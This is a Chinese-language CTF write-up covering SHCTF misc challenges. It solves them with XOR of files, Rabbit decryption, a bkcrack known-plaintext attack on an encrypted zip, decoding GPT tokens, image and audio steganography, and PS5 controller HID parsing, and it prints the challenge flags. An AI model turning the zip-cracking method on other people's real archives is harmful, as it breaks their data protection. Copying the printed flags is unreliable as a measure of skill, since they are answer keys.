+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python xor.py
+</span></span><span class="line"><span class="cl">rm -f xor.py flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>于是形成了题目附件所展示的文件集合</p>
+<p><strong>「解题脚本：」</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import xor
+</span></span><span class="line"><span class="cl">from os import listdir
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">files = [file for file in listdir() if file != &#39;solve.py&#39;]
+</span></span><span class="line"><span class="cl">flag = b&#39;&#39;
+</span></span><span class="line"><span class="cl">for file in files:
+</span></span><span class="line"><span class="cl">    file = open(file, &#39;rb&#39;).read()
+</span></span><span class="line"><span class="cl">    flag = xor(flag, file)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">print(flag)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="完" class="headerLink">
+    <a href="#%e5%ae%8c" class="header-mark"></a>完</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031221138545.png?imageSlim" title="image-20241031221138545" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031221138545.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031221138545.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031221138545.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031221138545.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031221138545.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031221138545">
+    </a></figure></p>
+<p>根据题目描述使用foobar2000查看歌词</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031221119578.png?imageSlim" title="image-20241031221119578" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031221119578.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031221119578.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031221119578.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031221119578.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031221119578.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031221119578">
+    </a></figure></p>
+<p>rabbit加密，密钥为Eason_Chan</p>
+<p><a href="http://www.esjson.com/rabbitEncrypt.html" target="_blank" rel="noopener noreferrer">http://www.esjson.com/rabbitEncrypt.html</a></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031221231947.png?imageSlim" title="image-20241031221231947" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031221231947.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031221231947.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031221231947.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031221231947.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031221231947.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031221231947">
+    </a></figure></p>
+<h3 id="the-secret-of-tokenizer" class="headerLink">
+    <a href="#the-secret-of-tokenizer" class="header-mark"></a>The Secret of Tokenizer</h3><p>bkcrack已知明文攻击</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bkcrack.exe -C .\challenge.zip -c challenge/LoveDays.otf -p plain.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到png和otf文件</p>
+<p>后面的otf文件丢到fontdrop网站查看</p>
+<p><a href="https://fontdrop.info/" target="_blank" rel="noopener noreferrer">https://fontdrop.info/</a></p>
+<p>在Data的description能看到密文</p>
+<p>然后在搜索后加上看压缩包的那个png文件提示发现其实这个是文本经过GPT的tokenization之后形成的token，用处是让GPT更好的理解输入文本的语义，句法和语义，然后其实在github搜也能找到tiktoken这个模块（这里选用GPT3.5）然后直接写脚本解密</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import tiktoken
+</span></span><span class="line"><span class="cl">enc = tiktoken.encoding_for_model(&#34;gpt-3.5-turbo&#34;)
+</span></span><span class="line"><span class="cl">text = [8758, 1182, 37, 90, 12174, 6803, 2632, 62, 22, 71, 18, 2632, 18, 31, 43, 2406, 11237, 1159, 564, 18, 77, 16, 89, 18, 5544, 1267, 19, 267, 18, 81, 12340, 92]
+</span></span><span class="line"><span class="cl">flag = enc.decode(text)
+</span></span><span class="line"><span class="cl">print(flag)
+</span></span><span class="line"><span class="cl">SHCTF{Oh_U_R_7h3_R3@L_LLM_Tok3n1z3rs_M4st3r!!!}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="拜师之旅-2" class="headerLink">
+    <a href="#%e6%8b%9c%e5%b8%88%e4%b9%8b%e6%97%85-2" class="header-mark"></a>拜师之旅③</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031224349617.png?imageSlim" title="image-20241031224349617" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031224349617.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031224349617.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031224349617.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031224349617.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031224349617.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031224349617">
+    </a></figure></p>
+<p>可以看到里面藏了zip文件</p>
+<p>foremost提取出压缩包，zsteg扫出密码</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031225020420.png?imageSlim" title="image-20241031225020420" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031225020420.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031225020420.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031225020420.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031225020420.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031225020420.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031225020420">
+    </a></figure></p>
+<p>在exif信息看到了real_size</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031232725336.png?imageSlim" title="image-20241031232725336" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031232725336.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031232725336.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031232725336.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031232725336.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031232725336.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031232725336">
+    </a></figure></p>
+<p>和原图刚好差12倍,使用脚本提取新图后得到flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">onfrom</span> <span class="n">PIL</span> <span class="kn">import</span> <span class="nn">Image</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;2.png&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">w</span> <span class="o">=</span> <span class="n">img</span><span class="o">.</span><span class="n">width</span>
+</span></span><span class="line"><span class="cl"><span class="n">h</span> <span class="o">=</span> <span class="n">img</span><span class="o">.</span><span class="n">height</span>
+</span></span><span class="line"><span class="cl"><span class="n">img_obj</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&#34;RGB&#34;</span><span class="p">,(</span><span class="n">w</span><span class="o">//</span><span class="mi">12</span><span class="p">,</span><span class="n">h</span><span class="o">//</span><span class="mi">12</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">w</span><span class="o">//</span><span class="mi">12</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">h</span><span class="o">//</span><span class="mi">12</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="n">g</span><span class="p">,</span><span class="n">b</span><span class="p">)</span><span class="o">=</span><span class="n">img</span><span class="o">.</span><span class="n">getpixel</span><span class="p">((</span><span class="n">x</span><span class="o">*</span><span class="mi">12</span><span class="p">,</span><span class="n">y</span><span class="o">*</span><span class="mi">12</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">img_obj</span><span class="o">.</span><span class="n">putpixel</span><span class="p">((</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">),(</span><span class="n">r</span><span class="p">,</span><span class="n">g</span><span class="p">,</span><span class="n">b</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">img_obj</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s1">&#39;3.png&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031232814178.png?imageSlim" title="image-20241031232814178" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031232814178.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031232814178.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031232814178.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031232814178.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241031232814178.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241031232814178">
+    </a></figure></p>
+<h2 id="week4" class="headerLink">
+    <a href="#week4" class="header-mark"></a>Week4</h2><h3 id="天命人" class="headerLink">
+    <a href="#%e5%a4%a9%e5%91%bd%e4%ba%ba" class="header-mark"></a>天命人</h3><p>发现了出题人半年前的博客</p>
+<p><a href="https://j-0k3r.github.io/2024/04/26/ps5%E6%89%8B%E6%9F%84usb&amp;%E8%93%9D%E7%89%99%E6%B5%81%E9%87%8F%E5%8D%8F%E8%AE%AE/" target="_blank" rel="noopener noreferrer">https://j-0k3r.github.io/2024/04/26/ps5%E6%89%8B%E6%9F%84usb&%E8%93%9D%E7%89%99%E6%B5%81%E9%87%8F%E5%8D%8F%E8%AE%AE/</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">def decode_hid_data(hex_string):
+</span></span><span class="line"><span class="cl">    # 将十六进制字符串转换为字节串
+</span></span><span class="line"><span class="cl">    bytes_data = bytes.fromhex(hex_string)
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    # 解析数据包
+</span></span><span class="line"><span class="cl">    report_id = bytes_data[0]
+</span></span><span class="line"><span class="cl">    left_stick_x = bytes_data[1]
+</span></span><span class="line"><span class="cl">    left_stick_y = bytes_data[2]
+</span></span><span class="line"><span class="cl">    right_stick_x = bytes_data[3]
+</span></span><span class="line"><span class="cl">    right_stick_y = bytes_data[4]
+</span></span><span class="line"><span class="cl">    l2_trigger = bytes_data[5]
+</span></span><span class="line"><span class="cl">    r2_trigger = bytes_data[6]
+</span></span><span class="line"><span class="cl">    vendor_defined = bytes_data[7]
+</span></span><span class="line"><span class="cl">   # 解析 Hat switch 按键
+</span></span><span class="line"><span class="cl">    hat_switch = bytes_data[8] &amp; 0x0F
+</span></span><span class="line"><span class="cl">    hat_direction = &#34;&#34;
+</span></span><span class="line"><span class="cl">    if hat_switch == 0x0:
+</span></span><span class="line"><span class="cl">        hat_direction = &#34;N&#34;
+</span></span><span class="line"><span class="cl">    elif hat_switch == 0x1:
+</span></span><span class="line"><span class="cl">        hat_direction = &#34;NE&#34;
+</span></span><span class="line"><span class="cl">    elif hat_switch == 0x2:
+</span></span><span class="line"><span class="cl">        hat_direction = &#34;E&#34;
+</span></span><span class="line"><span class="cl">    elif hat_switch == 0x3:
+</span></span><span class="line"><span class="cl">        hat_direction = &#34;SE&#34;
+</span></span><span class="line"><span class="cl">    elif hat_switch == 0x4:
+</span></span><span class="line"><span class="cl">        hat_direction = &#34;S&#34;
+</span></span><span class="line"><span class="cl">    elif hat_switch == 0x5:
+</span></span><span class="line"><span class="cl">        hat_direction = &#34;SW&#34;
+</span></span><span class="line"><span class="cl">    elif hat_switch == 0x6:
+</span></span><span class="line"><span class="cl">        hat_direction = &#34;W&#34;
+</span></span><span class="line"><span class="cl">    elif hat_switch == 0x7:
+</span></span><span class="line"><span class="cl">        hat_direction = &#34;NW&#34;
+</span></span><span class="line"><span class="cl">    elif hat_switch == 0x8:
+</span></span><span class="line"><span class="cl">        hat_direction = &#34;Neutral&#34;
+</span></span><span class="line"><span class="cl">    square_button = (bytes_data[8] &gt;&gt; 4) &amp; 0x01
+</span></span><span class="line"><span class="cl">    cross_button = (bytes_data[8] &gt;&gt; 5) &amp; 0x01
+</span></span><span class="line"><span class="cl">    circle_button = (bytes_data[8] &gt;&gt; 6) &amp; 0x01
+</span></span><span class="line"><span class="cl">    triangle_button = (bytes_data[8] &gt;&gt; 7) &amp; 0x01
+</span></span><span class="line"><span class="cl">    l1_button = bytes_data[9] &amp; 0x01
+</span></span><span class="line"><span class="cl">    r1_button = (bytes_data[9] &gt;&gt; 1) &amp; 0x01
+</span></span><span class="line"><span class="cl">    l2_button = (bytes_data[9] &gt;&gt; 2) &amp; 0x01
+</span></span><span class="line"><span class="cl">    r2_button = (bytes_data[9] &gt;&gt; 3) &amp; 0x01
+</span></span><span class="line"><span class="cl">    create_button = (bytes_data[9] &gt;&gt; 4) &amp; 0x01
+</span></span><span class="line"><span class="cl">    options_button = (bytes_data[9] &gt;&gt; 5) &amp; 0x01
+</span></span><span class="line"><span class="cl">    l3_button = (bytes_data[9] &gt;&gt; 6) &amp; 0x01
+</span></span><span class="line"><span class="cl">    r3_button = (bytes_data[9] &gt;&gt; 7) &amp; 0x01
+</span></span><span class="line"><span class="cl">    ps_button = bytes_data[10] &amp; 0x01
+</span></span><span class="line"><span class="cl">    touchpad_button = (bytes_data[10] &gt;&gt; 1) &amp; 0x01
+</span></span><span class="line"><span class="cl">    mute_button = (bytes_data[10] &gt;&gt; 2) &amp; 0x01
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    # 输出按键状态
+</span></span><span class="line"><span class="cl">    print(&#34;Square&#34; if square_button else &#34;&#34;)
+</span></span><span class="line"><span class="cl">    print(&#34;Cross&#34; if cross_button else &#34;&#34;)
+</span></span><span class="line"><span class="cl">    print(&#34;Circle&#34; if circle_button else &#34;&#34;)
+</span></span><span class="line"><span class="cl">    print(&#34;Triangle&#34; if triangle_button else &#34;&#34;)
+</span></span><span class="line"><span class="cl">    print(hat_direction if hat_direction else &#34;&#34;)
+</span></span><span class="line"><span class="cl">    print(&#34;L1&#34; if l1_button else &#34;&#34;)
+</span></span><span class="line"><span class="cl">    print(&#34;R1&#34; if r1_button else &#34;&#34;)
+</span></span><span class="line"><span class="cl">    print(&#34;L2&#34; if l2_button else &#34;&#34;)
+</span></span><span class="line"><span class="cl">    print(&#34;R2&#34; if r2_button else &#34;&#34;)
+</span></span><span class="line"><span class="cl">    print(&#34;Create&#34; if create_button else &#34;&#34;)
+</span></span><span class="line"><span class="cl">    print(&#34;Options&#34; if options_button else &#34;&#34;)
+</span></span><span class="line"><span class="cl">    print(&#34;L3&#34; if l3_button else &#34;&#34;)
+</span></span><span class="line"><span class="cl">    print(&#34;R3&#34; if r3_button else &#34;&#34;)
+</span></span><span class="line"><span class="cl">    print(&#34;PS&#34; if ps_button else &#34;&#34;)
+</span></span><span class="line"><span class="cl">    print(&#34;Touchpad&#34; if touchpad_button else &#34;&#34;)
+</span></span><span class="line"><span class="cl">    print(&#34;Mute&#34; if mute_button else &#34;&#34;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 示例数据包的十六进制字符串表示
+</span></span><span class="line"><span class="cl">hex_string = &#34;01827d828000003908200100eb8d076f0000ffff000016009a1fe604bc4a0f03ff80000000800000000005040000000000505e0f032918005e95af2cd222910d&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 解码并输出按键
+</span></span><span class="line"><span class="cl">decode_hid_data(hex_string)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>按照说明进行拼接</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SHCTF{L1+E_R2+R2_Square+R2_Cross+L2_R2+L3_R2+PS_Options}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="今日无事勾栏听曲" class="headerLink">
+    <a href="#%e4%bb%8a%e6%97%a5%e6%97%a0%e4%ba%8b%e5%8b%be%e6%a0%8f%e5%90%ac%e6%9b%b2" class="header-mark"></a>今日无事,勾栏听曲。</h3><p>audacity导入原始数据</p>
+<p><figure><a class="lightgallery" href="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113185216799.png" title="image-20241113185216799" data-thumbnail="C:\Users\scofi\AppData\Roaming\Typora\typora-user-images\image-20241113185216799.png">
+        <img
+            
+            loading="lazy"
+            src="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113185216799.png"
+            srcset="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113185216799.png, C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113185216799.png 1.5x, C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113185216799.png 2x"
+            sizes="auto"
+            alt="image-20241113185216799">
+    </a></figure></p>
+<p>高低频隐写</p>
+<p>使用audacity导出wav音频，使用脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import numpy as np
+</span></span><span class="line"><span class="cl">from scipy.io import wavfile
+</span></span><span class="line"><span class="cl">from scipy.fft import fft
+</span></span><span class="line"><span class="cl">sample_rate = 44100  # 采样率
+</span></span><span class="line"><span class="cl">duration_per_bit = 0.01  # 持续时间
+</span></span><span class="line"><span class="cl">low_freq = 440  # 低频表示0
+</span></span><span class="line"><span class="cl">high_freq = 880  # 高频表示1
+</span></span><span class="line"><span class="cl">threshold = 660  # 分界线
+</span></span><span class="line"><span class="cl">input_file = &#39;music.wav&#39;
+</span></span><span class="line"><span class="cl">rate, data = wavfile.read(input_file)
+</span></span><span class="line"><span class="cl">samples_per_bit = int(sample_rate * duration_per_bit)
+</span></span><span class="line"><span class="cl">bit_sequence = []
+</span></span><span class="line"><span class="cl">for i in range(0, len(data), samples_per_bit):
+</span></span><span class="line"><span class="cl">   bit_data = data[i:i + samples_per_bit]
+</span></span><span class="line"><span class="cl">   spectrum = np.abs(fft(bit_data))[:samples_per_bit // 2]
+</span></span><span class="line"><span class="cl">   freqs = np.fft.fftfreq(len(bit_data), 1 / sample_rate)[:samples_per_bit // 2]
+</span></span><span class="line"><span class="cl">   dominant_freq = freqs[np.argmax(spectrum)]
+</span></span><span class="line"><span class="cl">   if dominant_freq &lt; threshold:
+</span></span><span class="line"><span class="cl">        bit_sequence.append(&#39;0&#39;)
+</span></span><span class="line"><span class="cl">   else:
+</span></span><span class="line"><span class="cl">        bit_sequence.append(&#39;1&#39;)
+</span></span><span class="line"><span class="cl">bit_string = &#39;&#39;.join(bit_sequence)
+</span></span><span class="line"><span class="cl">output_txt_file = &#39;result.txt&#39;
+</span></span><span class="line"><span class="cl">with open(output_txt_file, &#39;w&#39;) as f:
+</span></span><span class="line"><span class="cl">   f.write(bit_string)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到01之后，cyberchef</p>
+<p><figure><a class="lightgallery" href="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113221730597.png" title="image-20241113221730597" data-thumbnail="C:\Users\scofi\AppData\Roaming\Typora\typora-user-images\image-20241113221730597.png">
+        <img
+            
+            loading="lazy"
+            src="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113221730597.png"
+            srcset="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113221730597.png, C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113221730597.png 1.5x, C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113221730597.png 2x"
+            sizes="auto"
+            alt="image-20241113221730597">
+    </a></figure></p>
+<p>得到rar，解压</p>
+<p><figure><a class="lightgallery" href="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113221847248.png" title="image-20241113221847248" data-thumbnail="C:\Users\scofi\AppData\Roaming\Typora\typora-user-images\image-20241113221847248.png">
+        <img
+            
+            loading="lazy"
+            src="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113221847248.png"
+            srcset="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113221847248.png, C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113221847248.png 1.5x, C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113221847248.png 2x"
+            sizes="auto"
+            alt="image-20241113221847248">
+    </a></figure></p>
+<p>看一下压缩包的详细信息发现是2.9老版本的winrar进行压缩的，5.0及以上版本rar格式压缩算法就不一样了</p>
+<p>RAR 由可变长的块组成，这些块的没有固定的先后顺序，但要求第一个块必须是标志块并且其后紧跟一个归档头部块。每个块均以以下字段开头</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">字段名称</th>
+<th style="text-align:center">长度(byte)</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">HEAD_CRC</td>
+<td style="text-align:center">2</td>
+<td style="text-align:left">所有块或块部分的CRC</td>
+</tr>
+<tr>
+<td style="text-align:left">HEAD_TYPE</td>
+<td style="text-align:center">1</td>
+<td style="text-align:left">块类型</td>
+</tr>
+<tr>
+<td style="text-align:left">HEAD_FLAGS</td>
+<td style="text-align:center">2</td>
+<td style="text-align:left">块标记</td>
+</tr>
+<tr>
+<td style="text-align:left">HEAD_SIZE</td>
+<td style="text-align:center">2</td>
+<td style="text-align:left">块大小</td>
+</tr>
+<tr>
+<td style="text-align:left">ADD_SIZE</td>
+<td style="text-align:center">4</td>
+<td style="text-align:left">可选结构 - 增加块大小</td>
+</tr>
+</tbody>
+</table>
+<p>HEAD_TYPE 不同的值有对应的块类型</p>
+<ul>
+<li><code>HEAD_TYPE = 0x72</code> - MARK_HEAD(标记块)</li>
+<li><code>HEAD_TYPE = 0x73</code> - MAIN_HEAD(压缩文件头)</li>
+<li><code>HEAD_TYPE = 0x74</code> - FILE_HEAD(文件头)</li>
+<li><code>HEAD_TYPE = 0x75</code> - COMM_HEAD(旧风格的注释头)</li>
+<li><code>HEAD_TYPE = 0x76</code> - AV_HEAD(旧风格的授权信息块/用户身份信息块)</li>
+<li><code>HEAD_TYPE = 0x77</code> - SUB_HEAD(旧风格的子块)</li>
+<li><code>HEAD_TYPE = 0x78</code> - PROTECT_HEAD(旧风格的恢复记录)</li>
